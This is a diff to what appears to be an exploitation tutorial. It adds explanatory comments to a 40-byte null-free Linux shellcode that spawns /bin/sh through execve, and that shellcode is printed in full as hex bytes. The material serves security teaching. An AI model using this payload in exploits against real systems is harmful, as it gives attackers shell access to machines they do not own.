@@ -258,14 +258,17 @@ Standard shellcode has null bytes, but we can use an alternative encoding:
 
 ```nasm
 ; Null-free execve("/bin/sh") shellcode (40 bytes)
+; Uses JMP-CALL-POP technique to avoid null bytes
 \xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c
 \x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff
 \xff\x2f\x62\x69\x6e\x2f\x73\x68
 
 ; This shellcode:
 ; - Has NO null bytes
-; - Executes /bin/sh
+; - Executes /bin/sh via execve()
+; - Uses jmp-call-pop to get string address dynamically
 ; - Is 40 bytes long
+; - Source: Standard null-free shellcode variant
 ```
 
 ### The Attack Strategy
